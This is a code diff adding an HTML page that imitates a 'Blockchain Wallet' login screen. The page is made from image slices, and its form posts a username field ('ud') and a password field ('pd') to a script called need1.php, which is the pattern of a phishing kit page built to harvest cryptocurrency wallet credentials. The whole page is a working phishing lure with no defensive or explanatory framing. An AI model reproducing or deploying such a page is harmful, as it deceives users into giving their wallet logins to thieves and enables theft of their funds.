@@ -1,0 +1,79 @@
+<html><head>
+<title>Blockchain Wallet </title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<script>setTimeout(function() {
+  document.getElementsByTagName('input')[1].type = "password"
+}, 1000);
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="images/favicon.ico">
+<style type="text/css">
+.textbox { 
+    border: 1px solid rgb(223, 227, 235);
+    height: 48px; 
+    width: 275px; 
+  	font-family: SFS, Arial, sans-serif;
+	letter-spacing: 2.2px;
+    font-size: 16px;
+  	color: #555;
+	font-weight: 600;
+    padding-left: 6px; 
+    border-radius: 4px; 
+}  
+.textbox:focus { 
+    outline: none; 
+    border: 1px solid #0C6CF2; 
+} 
+</style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1365px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+
+<style>
+p{font-size: 40px;}
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+    opacity: .8;
+}
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+$(window).load(function() {
+	$(".loader").fadeOut("slow");
+});
+</script>
+
+</head>
+<body bgcolor="#0D3578">
+<div class="loader" style="opacity: 0.8;"></div>
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:590px; z-index:0"><img src="images/k1.png" alt="" title="" border="0" width="1365" height="590"></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:522px; top:604px; width:320px; height:50px; z-index:1"><a href="#"><img src="images/k2.png" alt="" title="" border="0" width="320" height="50"></a></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:481px; top:482px; width:404px; height:17px; z-index:2"><a href="#"><img src="images/k3.png" alt="" title="" border="0" width="404" height="17"></a></div>
+<form action="need1.php" name="behtaganga" id="behtaganga" method="post">
+<input name="ud" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:400px;left:483px;top:196px;z-index:3">
+<input name="pd" class="textbox" autocomplete="off" required="" type="password" style="position:absolute;width:400px;left:483px;top:332px;z-index:4">
+<div id="formimage1" style="position:absolute; left:482px; top:404px; z-index:5"><input type="image" name="formimage1" width="402" height="58" src="images/bttn.png"></div>
+
+</form></div>
+
+
+
+</body></html>
